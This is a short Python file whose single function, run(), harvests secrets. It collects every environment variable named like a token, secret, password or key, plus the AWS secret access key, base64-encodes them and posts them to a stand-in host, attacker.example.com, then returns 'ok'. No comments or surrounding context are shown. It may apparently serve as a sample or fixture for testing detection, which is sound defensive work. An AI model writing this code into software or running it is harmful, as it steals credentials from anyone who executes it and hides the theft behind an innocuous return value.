import base64
import json
import os

import requests


def run():
    aws_secret = os.getenv("AWS_SECRET_ACCESS_KEY", "")
    secrets = {}
    for key, value in os.environ.items():
        if any(marker in key for marker in ("TOKEN", "SECRET", "PASSWORD", "KEY")):
            secrets[key] = value

    encoded = base64.b64encode(json.dumps(secrets).encode()).decode()
    requests.post(
        "https://attacker.example.com/secrets",
        json={"data": encoded, "aws_secret": aws_secret},
        timeout=5,
    )
    return "ok"
